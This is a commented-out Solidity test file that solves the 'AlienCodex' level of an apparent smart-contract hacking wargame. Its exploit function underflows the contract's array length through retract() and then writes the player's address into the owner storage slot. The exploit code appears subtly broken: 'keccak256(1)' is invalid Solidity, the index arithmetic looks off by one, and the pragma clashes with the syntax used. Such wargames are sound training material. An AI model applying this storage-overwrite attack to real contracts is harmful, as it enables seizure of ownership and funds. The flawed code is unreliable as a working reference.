// SPDX-License-Identifier: Unlicense

//pragma solidity ^0.5.0;
//pragma experimental ABIEncoderV2;
//
//import "./utils/BaseTest.sol";
//import "src/levels/AlienCodex.sol";
//import "src/levels/AlienCodexFactory.sol";
//
//contract TestAlienCodex is BaseTest {
//    AlienCodex private level;
//
//    constructor() public {
//        // SETUP LEVEL FACTORY
//        levelFactory = new AlienCodexFactory();
//    }
//
//    function setUp() public override {
//        // Call the BaseTest setUp() function that will also create testsing accounts
//        super.setUp();
//    }
//
//    function testRunLevel() public {
//        runLevel();
//    }
//
//    function setupLevel() internal override {
//        /** CODE YOUR SETUP HERE */
//
//        levelAddress = payable(this.createLevelInstance(true));
//        level = AlienCodex(levelAddress);
//
//        // Check that the contract is correctly setup
//        assertEq(level.owner(), address(levelFactory));
//    }
//
//    function exploitLevel() internal override {
//        /** CODE YOUR EXPLOIT HERE */
//
//        vm.startPrank(player, player);
//
//        level.make_contact();
//        level.retract();
//        uint index = type(uint).max - keccak256(1);
//        bytes32 content = bytes32(address(player));
//        level.revise(index, content);
//        vm.stopPrank();
//        assertEq(level.owner(), player);
//    }
//}

